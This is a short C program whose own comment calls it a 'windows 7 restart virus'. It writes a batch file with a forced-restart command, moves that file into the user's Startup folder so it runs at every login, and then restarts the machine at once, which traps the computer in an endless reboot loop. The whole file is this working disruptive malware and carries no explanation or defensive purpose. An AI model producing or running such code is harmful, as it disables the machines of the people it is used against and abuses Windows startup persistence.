#include <stdio.h>
#include <stdlib.h>

//windows 7 restart virus
int main()
{
    FILE *fp;
    fp = fopen("start.bat", "w+");
    fprintf(fp, "@shutdown -r -t 1\n");
    fclose(fp);
    system("@move start.bat \"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup\"");
    system("@shutdown -r -t 1\n");
}